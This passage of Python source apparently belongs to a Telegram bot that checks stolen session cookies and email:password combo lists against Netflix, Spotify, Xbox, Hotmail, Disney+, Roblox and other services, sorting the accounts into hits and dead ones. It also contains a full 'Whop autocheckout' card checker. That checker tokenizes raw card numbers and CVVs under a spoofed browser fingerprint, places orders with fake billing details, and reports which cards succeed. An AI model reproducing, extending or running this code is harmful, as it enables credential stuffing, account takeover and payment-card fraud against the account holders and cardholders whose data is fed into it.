        f"{E_PLAN}  <b>Password   :</b> <code>{r.get('password','?')}</code>\n"
        f"{XB_TAG}  <b>Gamertag   :</b> <code>{r.get('gamertag','N/A')}</code>\n"
        f"{XB_SCORE}  <b>Gamerscore :</b> <code>{r.get('gamerscore',0)}G</code>\n"
        f"{XB_SUB}  <b>GamePass   :</b> <code>{r.get('gamepass','none')}</code>\n"
        f"{XB_GAME}  <b>Games      :</b> <code>{r.get('games_count',0)}</code>\n\n"
        f"<b>Games List:</b>\n<code>{games_preview}</code>"
    )


def xboxcap_fmt_progress(done: int, total: int, hits: int, bad: int, tfa: int, err: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Xbox Full Capture</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{XB_HIT} Hits : <b>{hits}</b>\n"
        f"{SS_DEAD} Bad  : <b>{bad}</b>\n"
        f"{MSFC_2FA} 2FA  : <b>{tfa}</b>\n"
        f"❌ Error : <b>{err}</b>"
    )


def xboxcap_fmt_summary(total: int, hits: int, bad: int, tfa: int, err: int, elapsed: float) -> str:
    pct = f"{hits / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Xbox Full Capture Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total : <b>{total}</b>\n"
        f"{XB_HIT} Hits  : <b>{hits}</b>  (<i>{pct}%</i>)\n"
        f"{SS_DEAD} Bad   : <b>{bad}</b>\n"
        f"{MSFC_2FA} 2FA  : <b>{tfa}</b>\n"
        f"❌ Error : <b>{err}</b>\n"
        f"{E_CLOCK} Time  : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ▼ P4 END — PASTE P5 (/ady command handler) AFTER THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    WHOP AUTOCHECKOUT ENGINE (new)                       ║
# ╚══════════════════════════════════════════════════════════════════════════╝

WHOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"
WHOP_BT_API_KEY = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
WHOP_BT_DEVICE_INFO = {
    "uaBrands": [
        {"brand": "Chromium", "version": "152"},
        {"brand": "Not?A_Brand", "version": "24"},
        {"brand": "Brave", "version": "152"},
    ],
    "uaMobile": False, "uaPlatform": "Windows", "languages": ["en-US"],
    "timeZone": "Asia/Calcutta", "cookiesEnabled": True,
    "localStorageEnabled": True, "sessionStorageEnabled": True,
    "platform": "Win32", "hardwareConcurrency": 3, "deviceMemoryGb": 8,
    "screenWidth": 2560, "screenHeight": 1440,
    "screenAvailWidth": 2560, "screenAvailHeight": 1440,
    "innerWidth": 850, "innerHeight": 1168,
    "devicePixelRatio": 0.6666666865348816, "maxTouchPoints": 0,
    "plugins": ["Browser PDF and PS plug in", "vXTw3j47", "PDF Viewer",
                "IjRvAfX", "Microsoft Edge PDF Viewer", "Chromium PDF Viewer",
                "WebKit built-in PDF"],
    "mimeTypes": ["application/pdf", "text/pdf"],
    "webdriver": False, "suspectedHeadless": False,
    "webglVendor": "Google Inc. (Intel)",
    "webglRenderer": "ANGLE (Intel, Intel(R) HD Graphics 530 (0x00001912) Direct3D11 vs_5_0 ps_5_0, D3D11)",
}
WHOP_BT_DEVICE_INFO_B64 = base64.b64encode(json.dumps(WHOP_BT_DEVICE_INFO).encode()).decode()


# ── NEW: multi-strategy plan_id resolver ──────────────────────────────────
def whop_parse_checkout_url(url: str, session_obj=None) -> Tuple[Optional[str], Optional[str]]:
    """
    Multi-strategy plan_id resolver.
    Handles:
      • /checkout/plan_abc              (path segment)
      • /checkout/plan_abc/slug         (path segment + trailing slug)
      • /c/shortlink                    (follows redirect)
      • /product/xyz                    (scrapes page for plan_)
      • /app/checkout/xyz               (scrapes page)
      • ?session=abc                    (query)
      • ?plan=plan_abc                  (query)
    Falls back to page scrape (__NEXT_DATA__ + regex + data-attrs).
    Returns (plan_id, session_id).
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    path_parts = [p for p in parsed.path.split("/") if p]

    plan_id = None
    session_id = params.get("session", [None])[0] or params.get("checkout_session", [None])[0]

    # 1. Path segment starting with plan_
    for p in path_parts:
        if p.startswith("plan_") and len(p) > 5:
            plan_id = p
            break

    # 2. Query param plan / planId / plan_id / planID
    if not plan_id:
        for k in ("plan", "planId", "plan_id", "planID"):
            v = params.get(k, [None])[0]
            if v and v.startswith("plan_"):
                plan_id = v
                break

    # 3. Follow redirects (short links like /c/X)
    if not plan_id and session_obj is not None:
        try:
            r = session_obj.get(url, allow_redirects=True, timeout=15, verify=False)
            final = r.url or ""
            if final != url:
                fp = urlparse(final)
                fpaths = [p for p in fp.path.split("/") if p]
                for p in fpaths:
                    if p.startswith("plan_") and len(p) > 5:
                        plan_id = p
                        break
                if not plan_id:
                    fparams = parse_qs(fp.query)
                    for k in ("plan", "planId", "plan_id", "planID"):
                        v = fparams.get(k, [None])[0]
                        if v and v.startswith("plan_"):
                            plan_id = v
                            break
                if not session_id:
                    session_id = parse_qs(fp.query).get("session", [None])[0]
        except Exception:
            pass

    # 4. Scrape page HTML for plan_ / __NEXT_DATA__ / data-attrs
    if not plan_id and session_obj is not None:
        try:
            r = session_obj.get(url, allow_redirects=True, timeout=15, verify=False)
            html = r.text or ""

            # 4a. __NEXT_DATA__ JSON walk
            m = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
            if m:
                try:
                    nd = json.loads(m.group(1))
                    def _walk(o, d=0):
                        if d > 15:
                            return None
                        if isinstance(o, dict):
                            for k, val in o.items():
                                if isinstance(val, str) and val.startswith("plan_") and len(val) > 5:
                                    return val
                                r2 = _walk(val, d + 1)
                                if r2:
                                    return r2
                        elif isinstance(o, list):
                            for item in o:
                                r2 = _walk(item, d + 1)
                                if r2:
                                    return r2
                        return None
                    found = _walk(nd)
                    if found:
                        plan_id = found
                except Exception:
                    pass

            # 4b. Direct JSON field patterns
            if not plan_id:
                for pat in [
                    r'"plan"\s*:\s*"(plan_[A-Za-z0-9]+)"',
                    r'"planId"\s*:\s*"(plan_[A-Za-z0-9]+)"',
                    r'"plan_id"\s*:\s*"(plan_[A-Za-z0-9]+)"',
                    r'"planID"\s*:\s*"(plan_[A-Za-z0-9]+)"',
                    r'"id"\s*:\s*"(plan_[A-Za-z0-9]+)"',
                ]:
                    m = re.search(pat, html)
                    if m:
                        plan_id = m.group(1)
                        break

            # 4c. HTML data attributes
            if not plan_id:
                for pat in [
                    r'data-plan-id="(plan_[A-Za-z0-9]+)"',
                    r'data-plan="(plan_[A-Za-z0-9]+)"',
                ]:
                    m = re.search(pat, html)
                    if m:
                        plan_id = m.group(1)
                        break

            # 4d. Last resort — bare plan_ match
            if not plan_id:
                m = re.search(r'(plan_[A-Za-z0-9]{8,})', html)
                if m:
                    plan_id = m.group(1)
        except Exception:
            pass

    return plan_id, session_id


def whop_parse_card(card_str: str) -> Optional[Dict]:
    parts = [p.strip() for p in card_str.replace("/", "|").split("|")]
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    if not (cc.isdigit() and len(cc) >= 13 and mm.isdigit() and len(mm) <= 2
            and yy.isdigit() and len(yy) == 4
            and cvv.isdigit() and len(cvv) in (3, 4)):
        return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


def whop_sha256(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


def whop_check_card(checkout_url: str, email: str, card: Dict,
                    proxy: Optional[str] = None) -> Dict:
    """
    Full Whop autocheckout flow. Email REQUIRED (was optional — fixed).
    Returns:
      {"status": "SUCCESS"|"FAILED"|"ERROR", "message": str,
       "plan_id": str, "plan_name": str, "amount": str, "currency": str,
       "email": str, "card_last4": str}
    """
    result = {
        "status": "ERROR", "message": "unknown",
        "plan_id": "", "plan_name": "N/A", "amount": "N/A",
        "currency": "", "email": email or "",
        "card_last4": card["cc"][-4:],
    }

    if "whop.com" not in checkout_url:
        result["message"] = "invalid_url"
        return result

    # Validate email upfront
    final_email = (email or "").strip()
    if not final_email or "@" not in final_email:
        result["message"] = "invalid_email"
        return result
    result["email"] = final_email

    # Build session
    try:
        if _CURL_CFFI_OK:
            session = creq.Session(impersonate="chrome")
        else:
            session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
    except Exception as e:
        result["message"] = f"session_init: {str(e)[:40]}"
        return result

    whop_api_base = "https://api.whop.com/api/v1"
    whop_headers = {
        "accept": "application/json", "content-type": "application/json",
        "Api-Version-Date": "2026-08-25-2", "Whop-Private-Schema": "true",
        "X-Fern-Language": "JavaScript", "X-Fern-Runtime": "browser",
        "X-Fern-Runtime-Version": WHOP_UA, "user-agent": WHOP_UA,
        "origin": "https://whop.com", "referer": checkout_url,
    }

    def whop_post(path, body, extra_headers=None):
        h = {**whop_headers}
        if extra_headers:
            h.update(extra_headers)
        return session.post(f"{whop_api_base}{path}", headers=h, json=body, timeout=60)

    try:
        # Resolve plan_id — multi-strategy with session for redirects/scrape
        plan_id, _ = whop_parse_checkout_url(checkout_url, session_obj=session)
        if not plan_id:
            result["message"] = "no_plan_id"
            return result
        result["plan_id"] = plan_id

        # Fetch page for biz_id (account_id) fallback
        try:
            r0 = session.get(checkout_url, timeout=20, allow_redirects=True)
            biz_match = re.search(r"biz_[A-Za-z0-9]+", r0.text or "")
            account_id = biz_match.group(0) if biz_match else ""
        except Exception:
            account_id = ""

        # Step 1: Create checkout session
        r1 = whop_post("/checkout_sessions", {"items": [{"plan": plan_id, "quantity": 1}]})
        if r1.status_code not in (200, 201):
            result["message"] = f"session_http_{r1.status_code}"
            return result
        cs = r1.json()
        checkout_id = cs["id"]
        client_secret_full = cs["client_secret"]
        account_id = cs.get("seller", {}).get("id", account_id)

        items = cs.get("items") or []
        if items:
            item = items[0] if isinstance(items[0], dict) else {}
            result["plan_name"] = item.get("name", "N/A")
        result["amount"] = cs.get("quote", {}).get("breakdown", {}).get("total", {}).get("amount", "N/A")
        result["currency"] = (cs.get("quote", {}).get("currency", "") or "").upper()

        # Step 2: Basistheory session
        r2 = session.post(
            "https://js.basistheory.com/api/sessions",
            headers={
                "accept": "*/*", "content-type": "application/json",
                "bt-api-key": WHOP_BT_API_KEY,
                "origin": "https://js.basistheory.com",
                "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html",
                "user-agent": WHOP_UA,
            },
            json={"deviceInfo": WHOP_BT_DEVICE_INFO},
            timeout=30,
        )
        if r2.status_code not in (200, 201):
            result["message"] = f"bt_session_http_{r2.status_code}"
            return result
        bt = r2.json()
        nonce = bt["nonce"]
        ssk = bt["session_key"]
        container_hash = whop_sha256(nonce)

        # Step 3: Tokenize card
        expires_at = (datetime.now(timezone.utc) + timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        token_body = {
            "type": "card",
            "containers": [f"/card-assembly/{container_hash}/"],
            "expiresAt": expires_at,
            "data": {
                "number": card["cc"],
                "expiration_month": int(card["mm"]),
                "expiration_year": int(card["yy"]),
                "cvc": card["cvv"],
            },
        }
        r3 = session.post(
            "https://js.basistheory.com/api/tokens",
            headers={
                "accept": "*/*", "bt-api-key": WHOP_BT_API_KEY,
                "bt-device-info": WHOP_BT_DEVICE_INFO_B64,
                "content-type": "application/json",
                "origin": "https://js.basistheory.com",
                "user-agent": WHOP_UA,
            },
            json=token_body, timeout=30,
        )
        if r3.status_code not in (200, 201):
            result["message"] = f"tokenize_http_{r3.status_code}"
            return result
        token_id = r3.json()["id"]

        # Step 4: Card payment method session
        whop_post("/payment_method_types/card/session",
                  {"account_id": account_id, "nonce": nonce},
                  extra_headers={"x-ssk": ssk})

        # Step 5: Confirmation token (with REQUIRED email)
        r5 = whop_post("/confirmation_tokens", {
            "account_id": account_id,
            "setup_future_usage": "off_session",
            "payment_method": {
                "type": "card", "category": "card",
                "card": {"token": token_id},
            },
            "billing_details": {
                "email": final_email, "name": "User",
                "address": {
                    "country": "US", "line1": "New York",
                    "city": "NEW YORK", "state": "NY", "postal_code": "10001",
                },
            },
            "return_url": checkout_url,
            "browser_info": {
                "platform": "Win32", "color_depth": 24,
                "screen_height": 1440, "screen_width": 2560,
                "javascript_enabled": True, "language": "en-US",
                "java_enabled": False, "browser_time_difference": -330,
            },
        }, extra_headers={"authorization": "Bearer public", "x-ssk": ssk})
        try:
            ct = r5.json()
        except Exception:
            ct = {}
        confirmation_token = ct.get("id", ct.get("token", ct.get("confirmation_token", "")))

        # Step 6: Confirm checkout
        r6 = whop_post(f"/checkout_sessions/{checkout_id}/confirm", {
            "client_secret": client_secret_full,
            "confirmation_token": confirmation_token,
            "attestations": {"tos_accepted": True},
        }, extra_headers={"x-ssk": ssk})
        try:
            conf = r6.json()
        except Exception:
            conf = {}

        err = conf.get("last_confirm_error") or {}
        resp_msg = err.get("message", "")

        if not resp_msg:
            polled = {}
            for _ in range(5):
                time.sleep(3)
                rp = session.get(
                    f"https://whop.com/api/v1/checkout_sessions/{checkout_id}",
                    params={"client_secret": client_secret_full},
                    headers={
                        "accept": "*/*", "api-version-date": "2026-08-25-2",
                        "user-agent": WHOP_UA, "origin": "https://whop.com",
                        "referer": checkout_url, "whop-private-schema": "true",
                        "x-fern-language": "JavaScript", "x-fern-runtime": "browser",
                        "x-fern-runtime-version": WHOP_UA, "x-ssk": ssk,
                    }, timeout=30,
                )
                try:
                    polled = rp.json()
                except Exception:
                    polled = {}
                resp_msg = (polled.get("last_confirm_error") or {}).get("message", "") or polled.get("message", "")
                if resp_msg:
                    break
                pay2 = (polled.get("payment") or {}).get("status", "")
                if pay2 in ("succeeded", "failed", "canceled"):
                    resp_msg = pay2
                    break
            if not resp_msg:
                pay2 = (polled.get("payment") or {}).get("status", "") if polled else ""
                resp_msg = pay2 or "no_message"

        result["message"] = resp_msg or "unknown"
        msg_lower = result["message"].lower()
        if any(k in msg_lower for k in ("success", "succeeded", "approved", "paid", "confirmed")):
            result["status"] = "SUCCESS"
        elif any(k in msg_lower for k in ("declin", "insufficient", "invalid", "incorrect", "expired",
                                          "card_declined", "fraud", "3ds", "authentication_required")):
            result["status"] = "FAILED"
        else:
            result["status"] = "FAILED"
        return result

    except Exception as e:
        result["message"] = f"exception: {str(e)[:60]}"
        return result


def whop_fmt_result(r: dict, idx: int) -> str:
    if r.get("status") == "SUCCESS":
        head = f"╔══════════════════════════════╗\n║  {WH_OK} <b>WHOP ORDER SUCCESS</b> #{idx:02d}  ║\n╚══════════════════════════════╝"
    elif r.get("status") == "FAILED":
        head = f"╔══════════════════════════════╗\n║  {WH_FAIL} <b>WHOP ORDER DECLINED</b> #{idx:02d} ║\n╚══════════════════════════════╝"
    else:
        head = f"╔══════════════════════════════╗\n║  {WH_CARD} <b>WHOP ERROR</b> #{idx:02d}         ║\n╚══════════════════════════════╝"
    return (
        f"{head}\n\n"
        f"{WH_CARD}  <b>Card    :</b> <code>****{r.get('card_last4','????')}</code>\n"
        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','?') or '(not provided)'}</code>\n"
        f"{WH_ICON}  <b>Plan    :</b> <code>{r.get('plan_name','N/A')}</code>\n"
        f"{E_PLAN}  <b>Amount  :</b> <code>{r.get('amount','N/A')} {r.get('currency','')}</code>\n"
        f"{WH_CART}  <b>Status  :</b> <code>{r.get('status','?')}</code>\n"
        f"💬  <b>Resp    :</b> <code>{(r.get('message','') or '')[:80]}</code>"
    )


# ▼ CHUNK 6 END — PASTE CHUNK 7 BELOW THIS LINE ▼
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    IN-MEMORY USER STATE                                 ║
# ╚══════════════════════════════════════════════════════════════════════════╝

SERVICES = {
    "surfshark":    "🛡 Surfshark",
    "spotify":      "🎵 Spotify",
    "hotstar":      "🎯 JioHotstar",
    "netflix":      "🎬 Netflix",
    "netflixcap":   "🎬 Netflix Cap",
    "hbomax":       "🎬 HBO Max",
    "hotmail":      "📧 Hotmail Inbox",
    "msfullcap":    "💰 MS Full Cap",
    "crunchyroll":  "🍥 Crunchyroll",
    "crunchyroll2": "🍥 Crunchyroll 2",
    "expressvpn":   "🚀 ExpressVPN",
    "primevideo":   "📺 Prime Video",
    "xbox":         "🎮 Xbox Auditor",
    "xboxcap":      "🎮 Xbox Full Capture",
    "dazn":         "🏆 DAZN",
    "deezer":       "🎵 Deezer",
    "disney":       "🏰 Disney+",
    "roblox":       "🎮 Roblox",
}

# Xbox emojis
XB_PREMIUM = _e("6070856180345868814", "🟢")
XB_HIT     = _e("5296372434692234934", "💚")
XB_FREE    = _e("5123344136665039833", "⚪")
XB_NOXBOX  = _e("6102394417258171824", "⚠️")
XB_TAG     = _e("6071202170026332329", "🏷")
XB_SCORE   = _e("5226929552319594190", "🔢")
XB_GAME    = _e("5278712667337409114", "🎮")
XB_SUB     = _e("5310278924616356636", "💰")
XB_MC      = _e("4986012398461649574", "🎬")


def _fresh_state():
    return {
        "mode":       "surfshark",
        "processing": False,
        # Surfshark
        "ss_premium": [], "ss_free": [], "ss_dead": [], "ss_total": 0,
        "ss_awaiting_code": False, "ss_login_data": None,
        # Spotify
        "sp_premium": [], "sp_free": [], "sp_dead": [], "sp_total": 0,
        "sp_awaiting_tv": False, "sp_tv_data": None,
        # JioHotstar
        "hs_live": [], "hs_device": [], "hs_free": [], "hs_invalid": [], "hs_total": 0,
        "hs_awaiting_qr": False, "hs_vault_upload": False,
        # Netflix simple
        "nf_premium": [], "nf_free": [], "nf_dead": [], "nf_tokens": [], "nf_total": 0,
        "nf_sub": "check", "nf_awaiting_tv": False, "nf_vault_upload": False,
        # HBO Max
        "hbo_live": [], "hbo_dead": [], "hbo_total": 0,
        "hbo_awaiting_tv": False, "hbo_tv_data": None,
        # Hotmail
        "hm_hits": [], "hm_dead": [], "hm_total": 0,
        # MS FullCap
        "msfc_hits": [], "msfc_bad": [], "msfc_2fa": [], "msfc_total": 0,
        # Crunchyroll 1
        "cr_hit": [], "cr_custom": [], "cr_fail": [], "cr_retry": [], "cr_total": 0,
        "cr_sub": "check",
        # Crunchyroll 2
        "cr2_valid": [], "cr2_premium": [], "cr2_free": [],
        "cr2_invalid": [], "cr2_mfa": [], "cr2_total": 0,
        "cr2_sub": "check",
        # Netflix Cap
        "nfc_hit": [], "nfc_free": [], "nfc_bad": [], "nfc_2fa": [], "nfc_custom": [],
        "nfc_total": 0,
        # ExpressVPN
        "ex_premium": [], "ex_free": [], "ex_dead": [], "ex_retry": [], "ex_total": 0,
        # Prime Video
        "pv_paid": [], "pv_free": [], "pv_unknown": [], "pv_duplicate": [],
        "pv_failed": [], "pv_error": [], "pv_total": 0,
        "pv_seen_keys": set(),
        # Xbox Auditor
        "xbox_premium": [], "xbox_hit": [], "xbox_free": [], "xbox_noxbox": [],
        "xbox_bad": [], "xbox_locked": [], "xbox_error": [], "xbox_total": 0,
        # Xbox Full Capture
        "xboxcap_hits": [], "xboxcap_bad": [], "xboxcap_2fa": [],
        "xboxcap_error": [], "xboxcap_total": 0,
        # DAZN
        "dazn_hit": [], "dazn_free": [], "dazn_bad": [],
        "dazn_retry": [], "dazn_error": [], "dazn_total": 0,
        # Deezer
        "deezer_premium": [], "deezer_free": [], "deezer_bad": [],
        "deezer_retry": [], "deezer_error": [], "deezer_total": 0,
        # Disney+
        "disney_hit": [], "disney_free": [], "disney_bad": [],
        "disney_retry": [], "disney_custom": [], "disney_error": [],
        "disney_total": 0,
        # Roblox
        "roblox_hit": [], "roblox_premium": [], "roblox_free": [],
        "roblox_bad": [], "roblox_2fa": [], "roblox_locked": [],
        "roblox_error": [], "roblox_total": 0,
    }


user_results: dict = defaultdict(_fresh_state)


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    KEYBOARDS                                            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def _btn(text: str, callback_data: str = None, url: str = None,
         icon_id: str = None, style: str = "primary") -> dict:
    btn: dict = {"text": text}
    if callback_data:
        btn["callback_data"] = callback_data
    if url:
        btn["url"] = url
    btn["icon_custom_emoji_id"] = icon_id or ""
    btn["style"] = style
    return btn


def main_markup(mode: str) -> dict:
    rows = [[
        _btn(bold("Results ZIP"), "get_results", icon_id="5408843502027033965", style="primary"),
        _btn(bold("Stats"),       "view_stats",  icon_id="5931472654660800739", style="primary"),
    ]]
    if mode == "surfshark":
        rows.append([
            _btn(bold("Login Device"), "ss_login_device", icon_id="6005570495603282482", style="success"),
            _btn(bold("Clear"),         "clear_all",       icon_id="5408832111773757273", style="danger"),
        ])
    elif mode == "spotify":
        rows.append([
            _btn(bold("Activate TV"), "sp_activate_tv", icon_id="5332726004253212527", style="success"),
            _btn(bold("Clear"),        "clear_all",      icon_id="5408832111773757273", style="danger"),
        ])
    elif mode == "hotstar":
        rows.append([
            _btn(bold("Activate TV"),  "hs_activate_qr",  icon_id="5332726004253212527", style="success"),
            _btn(bold("Upload Vault"), "hs_vault_upload", icon_id="6030822047150512346", style="primary"),
        ])
        rows.append([_btn(bold("Clear"), "clear_all", icon_id="5408832111773757273", style="danger")])
    elif mode == "netflix":
        rows.append([
            _btn(bold("Check Account"), "nf_sub_check",   icon_id="5444989577422993015", style="primary"),
            _btn(bold("NF Token"),       "nf_sub_nftoken", icon_id="6005570495603282482", style="primary"),
        ])
        rows.append([
            _btn(bold("Clean Cookies"), "nf_sub_clean",   icon_id="5845945815549350824", style="primary"),
            _btn(bold("TV Login"),       "nf_sub_tvlogin", icon_id="5332726004253212527", style="success"),
        ])
        rows.append([
            _btn(bold("Upload Vault"), "nf_vault_upload", icon_id="6030822047150512346", style="primary"),
            _btn(bold("Clear"),         "clear_all",       icon_id="5408832111773757273", style="danger"),
        ])
    elif mode == "hbomax":
        rows.append([
            _btn(bold("Activate TV"), "hbo_activate_tv", icon_id="5332726004253212527", style="success"),
            _btn(bold("Clear"),        "clear_all",       icon_id="5408832111773757273", style="danger"),
        ])
    elif mode == "crunchyroll":
        rows.append([
            _btn(bold("Check"), "cr_sub_check", icon_id="5444989577422993015", style="primary"),
            _btn(bold("Token"), "cr_sub_token", icon_id="6005570495603282482", style="success"),
        ])
        rows.append([_btn(bold("Clear"), "clear_all", icon_id="5408832111773757273", style="danger")])
    elif mode == "crunchyroll2":
        rows.append([
            _btn(bold("Check"), "cr2_sub_check", icon_id="5444989577422993015", style="primary"),
            _btn(bold("Token"), "cr2_sub_token", icon_id="6005570495603282482", style="success"),
        ])
        rows.append([_btn(bold("Clear"), "clear_all", icon_id="5408832111773757273", style="danger")])
    elif mode in ("netflixcap", "hotmail", "msfullcap", "expressvpn", "primevideo",
                  "xbox", "xboxcap", "dazn", "deezer", "disney", "roblox"):
        rows.append([_btn(bold("Clear"), "clear_all", icon_id="5408832111773757273", style="danger")])
    rows.append([
        _btn(bold("Format Guide"),   "format_help",    icon_id="5897846616966041652", style="primary"),
        _btn(bold("Switch Service"), "switch_service", icon_id="5408940598352687316", style="primary"),
    ])
    return {"inline_keyboard": rows}


def _service_markup() -> dict:
    return {"inline_keyboard": [
        [_btn(bold("Surfshark"),     "mode_surfshark",    icon_id="6037533655105016950", style="primary")],
        [_btn(bold("Spotify"),       "mode_spotify",      icon_id="5206361550939506453", style="success")],
        [_btn(bold("JioHotstar"),    "mode_hotstar",      icon_id="5035052828968617761", style="primary")],
        [_btn(bold("Netflix"),       "mode_netflix",      icon_id="5332726004253212527", style="danger")],
        [_btn(bold("Netflix Cap"),   "mode_netflixcap",   icon_id="5332726004253212527", style="danger")],
        [_btn(bold("HBO Max"),       "mode_hbomax",       icon_id="4986012398461649574", style="danger")],
        [_btn(bold("Hotmail"),       "mode_hotmail",      icon_id="5370857634440170316", style="primary")],
        [_btn(bold("MS Full Cap"),   "mode_msfullcap",    icon_id="5370857634440170316", style="success")],
        [_btn(bold("Crunchyroll"),   "mode_crunchyroll",  icon_id="4958621463574741708", style="primary")],
        [_btn(bold("Crunchyroll 2"), "mode_crunchyroll2", icon_id="4958621463574741708", style="success")],
        [_btn(bold("ExpressVPN"),    "mode_expressvpn",   icon_id="5255915900053239111", style="danger")],
        [_btn(bold("Prime Video"),   "mode_primevideo",   icon_id="4961180134506758889", style="primary")],
        [_btn(bold("Xbox Auditor"),  "mode_xbox",         icon_id="5373019729566908647", style="success")],
        [_btn(bold("Xbox Full Cap"), "mode_xboxcap",      icon_id="5373019729566908647", style="danger")],
        [_btn(bold("DAZN"),          "mode_dazn",         icon_id="4961018652326363924", style="success")],
        [_btn(bold("Deezer"),        "mode_deezer",       icon_id="4985999144192574149", style="primary")],
        [_btn(bold("Disney+"),       "mode_disney",       icon_id="5008435245893026844", style="danger")],
        [_btn(bold("Roblox"),        "mode_roblox",       icon_id="5208549725107676284", style="success")],
    ]}


def _ss_cancel_markup() -> dict:
    return {"inline_keyboard": [[_btn(bold("Cancel Login"), "ss_cancel_login", icon_id="5778527486270770928", style="danger")]]}

def _sp_cancel_markup() -> dict:
    return {"inline_keyboard": [[_btn(bold("Cancel"), "sp_cancel_tv", icon_id="5778527486270770928", style="danger")]]}

def _hs_qr_cancel_markup() -> dict:
    return {"inline_keyboard": [[_btn(bold("Cancel QR"), "hs_cancel_qr", icon_id="5778527486270770928", style="danger")]]}

def _hs_vault_cancel_markup() -> dict:
    return {"inline_keyboard": [[_btn(bold("Cancel Upload"), "hs_cancel_vault_upload", icon_id="5778527486270770928", style="danger")]]}

def _nf_tv_cancel_markup() -> dict:
    return {"inline_keyboard": [[_btn(bold("Cancel TV Login"), "nf_cancel_tv", icon_id="5778527486270770928", style="danger")]]}

def _nf_vault_cancel_markup() -> dict:
    return {"inline_keyboard": [[_btn(bold("Cancel Upload"), "nf_cancel_vault_upload", icon_id="5778527486270770928", style="danger")]]}

def _hbo_cancel_markup() -> dict:
    return {"inline_keyboard": [[_btn(bold("Cancel TV Activation"), "hbo_cancel_tv", icon_id="5778527486270770928", style="danger")]]}
# ▼ KEYBOARDS END — PASTE CHUNK 8C BELOW THIS LINE ▼

# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    START / WELCOME TEXT                                 ║
# ╚══════════════════════════════════════════════════════════════════════════╝

def start_text(mode: str) -> str:
    label = SERVICES.get(mode, "?")
    if mode == "surfshark":
        return (f"{SS_SHIELD} <b>Combined Cookie Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send a <code>.txt</code>, <code>.json</code>, or <code>.zip</code> cookie file.\n\n"
                f"{SS_PREMIUM} <b>PREMIUM</b>  ·  {SS_FREE} <b>FREE</b>  ·  {SS_DEAD} <b>DEAD</b>\n\n"
                f"Tap <b>{E_WRENCH} Switch Service</b> to change.")
    if mode == "spotify":
        return (f"{SP_MUSIC} <b>Combined Cookie Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send a <code>.txt</code>, <code>.json</code>, or <code>.zip</code> cookie file.\n\n"
                f"Use <b>{SP_TV} Activate TV</b> for device login.")
    if mode == "hotstar":
        return (f"{HS_TARGET} <b>Combined Cookie Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send a cookie file.\n\n{HS_LIVE} LIVE · {HS_DEVICE} DEVICE LIMIT · "
                f"{HS_FREE} FREE · {HS_INVALID} INVALID\n\n"
                f"{HS_TV} QR TV Login — Vault: <b>{hs_vault_available_count()}</b> available / "
                f"<b>{hs_vault_count()}</b> total")
    if mode == "netflix":
        return (f"{SP_MUSIC} <b>Netflix Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"{SP_PREMIUM} Check · {SP_CODE} Token · {SP_SPARK} Clean · {SP_TV} TV Login\n\n"
                f"Pick a mode below, then send a cookie file.\n"
                f"TV Vault: <b>{nf_vault_count()}</b> cookie(s)")
    if mode == "netflixcap":
        return (f"{SP_PREMIUM} <b>Netflix Cap (GraphQL)</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo file (<code>email:password</code> per line) or <code>.zip</code>.\n\n"
                f"Detects: HIT · FREE · BAD · 2FA · CUSTOM\n"
                f"<b>Requires:</b> <code>curl_cffi</code>")
    if mode == "hbomax":
        return (f"{HBO_ICON} <b>HBO Max Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send a cookie file.\n\n{HBO_LIVE} LIVE · {HBO_DEAD} DEAD\n\n"
                f"{HBO_TV} Activate TV with 6-digit code")
    if mode == "hotmail":
        return (f"{HM_HIT} <b>Hotmail Inbox Checker</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>email:password</code>) or <code>.zip</code>.\n\n"
                f"Detects 60+ linked services by sender-email match")
    if mode == "msfullcap":
        return (f"{MSFC_HIT} <b>Microsoft Full Cap</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo (<code>email:password</code>) or <code>.zip</code>.\n\n"
                f"Captures CardHolder · CC Funding · Items · Renew · Dates · Points")
    if mode == "crunchyroll":
        return (f"{CR_ICON} <b>Crunchyroll (FireTV)</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo or <code>.zip</code>.\n\n{SP_CODE} Check · {CR_TOKEN} Token")
    if mode == "crunchyroll2":
        return (f"{CR_ICON} <b>Crunchyroll 2 (SSO PKCE)</b>\n\nActive service: <b>{label}</b>\n\n"
                f"Send combo or <code>.zip</code>.\n\n{SP_CODE} Check · {CR_TOKEN} Token")
    if mode == "expressvpn":
